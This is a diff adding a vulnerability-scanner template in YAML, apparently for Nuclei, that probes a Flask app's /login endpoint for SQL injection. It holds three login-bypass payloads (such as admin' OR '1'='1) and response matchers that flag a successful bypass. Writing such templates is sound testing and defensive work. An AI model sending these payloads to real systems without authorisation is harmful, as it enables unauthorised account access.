@@ -1,0 +1,37 @@
+id: flask-sqli-login
+
+info:
+  name: Flask App - SQL Injection in Login
+  author: vulnremediate
+  severity: critical
+  description: SQL Injection vulnerability in /login endpoint
+  tags: sqli,flask,injection
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/login?username=admin'%20OR%20'1'='1&password=anything"
+      - "{{BaseURL}}/login?username=admin'--&password="
+      - "{{BaseURL}}/login?username='%20OR%201=1--&password=x"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "Welcome"
+          - "success"
+          - "logged"
+        condition: or
+        case-insensitive: true
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        regex:
+          - "Welcome.*"
+        part: body
